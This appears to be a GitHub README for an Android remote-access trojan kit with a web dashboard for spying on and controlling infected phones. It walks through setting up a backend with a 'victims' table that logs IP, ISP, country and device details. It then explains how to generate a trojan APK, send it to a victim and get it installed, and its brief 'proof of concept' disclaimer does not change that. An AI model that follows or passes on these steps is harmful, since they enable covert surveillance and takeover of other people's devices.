# Android-Trojan-2.0 - The Shady Upgrade
Yo folks! Welcome to the juiced-up version of Android-Trojan. We've been cooking up some spicy features for you, and we can't wait to spill the beans!

## What's Cooking?
**Web Magic**: We've slapped on a slick web UI that lets you wrangle multiple trojans like a boss. It's like Trojan control on steroids – but legal, you know?

**Android Puppetry**: Not just eye candy! it lets you not only peep but also pull the strings on entire Android devices. Mind-blowing, right?

**Tricky Business**: We threw in some ninja moves and exploited a few things just to make this cooler than your average malware. Wanna know the secrets? Check out the code – it's like a hacker's playground.

> Disclaimer: This is just a cheeky proof of concept. It's here to remind you that apps with too many permissions can be nosy neighbors. Watch your back and keep it safe out there!

---

https://github.com/shivamsuyal/Android-Trojan-2.0/assets/75232486/3433a39e-8077-4ffb-bb39-d00936c2aea7

---

## How to Use

### Setting Up Superbase
1.  **Create a Superbase Account:**
    *   Head over to [Superbase](https://superbase.com/).
    *   Create an account and grab your Superbase URL and Superbase Key.

2.  **Edit .env File:**
    *   Locate the `.env` file in the SneakyTrojan directory.
    *   Insert your Superbase URL and Superbase Key as instructed.

3.  **Open SQL Editor in Superbase:**
    *   Fire up the SQL editor in Superbase.

4.  **Run SQL Commands:**
    *   Copy and paste the following SQL commands to create necessary tables:

```sql
-- Victims Table
CREATE TABLE public.victims (
  "ID" character varying not null,
  "Country" character varying null,
  "ISP" character varying null,
  "IP" character varying null,
  "Brand" character varying null,
  "Model" character varying null,
  "Manufacture" character varying null,
  CONSTRAINT victims_pkey PRIMARY KEY ("ID")
) TABLESPACE pg_default;

-- Active User
CREATE TABLE public.activeuser (
  id BIGSERIAL PRIMARY KEY,
  username character varying null,
  password character varying null,
  name character varying null
) TABLESPACE pg_default;
```

5.  **Enter Data in ActiveUser Table:**
    *   Populate the `activeuser` table with your login details.

### Getting Ready
1.  **Install Node Packages:**
    *   Run `npm install` to grab all the necessary Node packages.

2.  **Android SDK:**
    *   Make sure you have the Android SDK installed for compiling your APK.

### Unleash the Drama
1.  **Run the Node App:**
    *   Execute `node app` in your terminal.

2.  **Login to the UI:**
    *   Navigate to the provided UI link and log in using your credentials.

3.  **Enter IP Address:**
    *   In the UI, enter your IP address in the designated text field.

4.  **Hit the Download Button:**
    *   Click the download button and cross your fingers! If all goes well, you should get your hands on a Trojan APK.

5.  **Send, Install, and Enjoy:**
    *   Share the Trojan APK with your victim.
    *   Once installed, sit back, relax, and enjoy the drama!
